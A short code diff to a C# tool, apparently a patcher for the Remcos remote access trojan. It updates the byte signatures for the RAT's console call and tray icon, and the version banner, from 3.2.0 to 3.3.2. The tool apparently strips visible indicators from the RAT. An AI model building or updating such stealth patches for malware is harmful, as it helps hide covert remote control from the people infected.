@@ -5,8 +5,8 @@ namespace RemcosPatcher
 {
     class Program
     {
-        static byte[] ConsoleCall = { 0xE8, 0xE5, 0x9B, 0x00, 0x00 };
-        static byte[] TrayIcon = { 0x57, 0x57, 0x57, 0x68, 0xF9, 0x2B, 0x41, 0x00, 0x57, 0x57, 0xFF, 0xD6 };
+        static byte[] ConsoleCall = { 0xE8, 0x3C, 0xA6, 0x00, 0x00 };
+        static byte[] TrayIcon = { 0x57, 0x57, 0x57, 0x68, 0x52, 0x36, 0x41, 0x00, 0x57, 0x57, 0xFF, 0xD6 };
 
         // https://stackoverflow.com/a/38625726/3658854
         static int Search(byte[] src, byte[] pattern)
@@ -29,7 +29,7 @@ namespace RemcosPatcher
 
         static void Main(string[] args)
         {
-            Console.WriteLine("Remcos RAT Patcher for version 3.2.0\n");
+            Console.WriteLine("Remcos RAT Patcher for version 3.3.2\n");
 
             if (args.Length == 0)
             {
